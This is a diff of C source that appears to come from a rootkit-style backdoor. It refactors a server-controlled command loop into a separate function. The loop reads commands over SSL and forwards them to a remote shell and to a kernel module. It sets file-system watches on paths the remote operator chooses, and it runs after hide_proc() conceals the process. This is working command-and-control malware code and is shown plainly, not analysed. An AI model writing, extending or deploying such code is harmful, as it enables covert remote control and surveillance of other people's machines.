@@ -459,6 +459,53 @@ void inotify_event_loop(void) {
     free(event_list);
 }
 
+void ssl_read_event_loop(SSL* ssl) {
+    //Read
+    for (;;) {
+        int size = SSL_read(ssl, buffer, MAX_PAYLOAD);
+        printf("Read %d from server\n", size);
+        if (size < 0) {
+            perror("SSL_read");
+            break;
+        } else if (size == 0) {
+            break;
+        }
+        if (buffer[0] == '!') {
+            if (size >= 7 && strncmp("watch", (char*) (buffer + 1), 5) == 0) {
+                //Register inotify handle here
+
+                //Clear newline character from path
+                buffer[strlen((char*) buffer) - 1] = '\0';
+                int wd;
+                if ((wd = inotify_add_watch(inot_fd, (char*) (buffer + 7),
+                             IN_CLOSE_WRITE | IN_ATTRIB | IN_IGNORED))
+                        < 0) {
+                    perror("inotify_add_watch");
+                    //exit(EXIT_FAILURE);
+
+                    strcpy((char*) buffer, "Bad inotify path");
+                    write(remote_shell_sock, buffer, strlen((char*) buffer));
+                    continue;
+                }
+                //Save watch descriptor
+                inot_wds[inot_watch_count].wd = wd;
+                strcpy(inot_wds[inot_watch_count].name, (char*) (buffer + 7));
+                ++inot_watch_count;
+            } else if (strncmp("unwatch", (char*) (buffer + 1), 7) == 0) {
+                unwatch_inotify();
+            } else {
+                printf("Wrote %d to kernel module\n", size);
+                write(conn_sock, buffer + 1, size - 1);
+            }
+        } else {
+            printf("Wrote %d to remote shell\n", size);
+            //Pass message to shell process
+            write(remote_shell_sock, buffer, size);
+        }
+        memset(buffer, 0, MAX_PAYLOAD);
+    }
+}
+
 /*
  * function:
  *    main
@@ -547,51 +594,7 @@ int main(void) {
         if (wrapped_fork()) {
             setsid();
             hide_proc();
-
-            //Read
-            for (;;) {
-                int size = SSL_read(ssl, buffer, MAX_PAYLOAD);
-                printf("Read %d from server\n", size);
-                if (size < 0) {
-                    perror("SSL_read");
-                    break;
-                } else if (size == 0) {
-                    break;
-                }
-                if (buffer[0] == '!') {
-                    if (size >= 7 && strncmp("watch", (char*) (buffer + 1), 5) == 0) {
-                        //Register inotify handle here
-
-                        //Clear newline character from path
-                        buffer[strlen((char*) buffer) - 1] = '\0';
-                        int wd;
-                        if ((wd = inotify_add_watch(inot_fd, (char*) (buffer + 7),
-                                     IN_CLOSE_WRITE | IN_ATTRIB | IN_IGNORED))
-                                < 0) {
-                            perror("inotify_add_watch");
-                            //exit(EXIT_FAILURE);
-
-                            strcpy((char*) buffer, "Bad inotify path");
-                            write(remote_shell_sock, buffer, strlen((char*) buffer));
-                            continue;
-                        }
-                        //Save watch descriptor
-                        inot_wds[inot_watch_count].wd = wd;
-                        strcpy(inot_wds[inot_watch_count].name, (char*) (buffer + 7));
-                        ++inot_watch_count;
-                    } else if (strncmp("unwatch", (char*) (buffer + 1), 7) == 0) {
-                        unwatch_inotify();
-                    } else {
-                        printf("Wrote %d to kernel module\n", size);
-                        write(conn_sock, buffer + 1, size - 1);
-                    }
-                } else {
-                    printf("Wrote %d to remote shell\n", size);
-                    //Pass message to shell process
-                    write(remote_shell_sock, buffer, size);
-                }
-                memset(buffer, 0, MAX_PAYLOAD);
-            }
+            ssl_read_event_loop(ssl);
         } else {
             setsid();
             hide_proc();
